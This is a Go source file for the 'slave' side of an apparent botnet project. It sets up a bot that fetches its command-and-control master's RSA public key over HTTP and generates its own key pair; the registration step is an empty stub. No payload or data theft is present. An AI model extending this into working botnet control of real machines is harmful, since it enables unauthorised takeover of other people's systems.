package slave

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/master"
)

// BotnetSlave is the slave program controller
type BotnetSlave struct {
	masterAddr   string
	masterPubKey *rsa.PublicKey
	slavePrivKey *rsa.PrivateKey
	// TODO: need a receive message channel
}

// NewBotnetSlave initializes a BotnetSlave to its master
func NewBotnetSlave(masterAddr string) (*BotnetSlave, error) {
	pubKey, err := getMasterPubKey(masterAddr)
	if err != nil {
		return nil, err
	}
	priv, _, err := encryption.GenerateRSAKeyPair()
	if err != nil {
		return nil, err
	}
	return &BotnetSlave{
		masterAddr:   masterAddr,
		masterPubKey: pubKey,
		slavePrivKey: priv,
	}, nil
}

func getMasterPubKey(masterAddr string) (*rsa.PublicKey, error) {
	req, err := http.NewRequest(http.MethodGet, fmt.Sprintf("%s%s", masterAddr, master.KeyEndpoint), nil)
	if err != nil {
		return nil, err
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	if err != nil {
		return nil, err
	}
	var kr *master.KeyResponse
	if err := json.Unmarshal(bodyBytes, &kr); err != nil {
		return nil, err
	}
	pubKey, err := encryption.DecodePubKeyPEM([]byte(kr.Key))
	if err != nil {
		return nil, err
	}
	return pubKey, nil
}

// Register registers the slave with the master (cmd and control server)
func (s *BotnetSlave) Register() error {
	// TODO: send encrypted registration request payload with pubkey to /join
	return nil
}
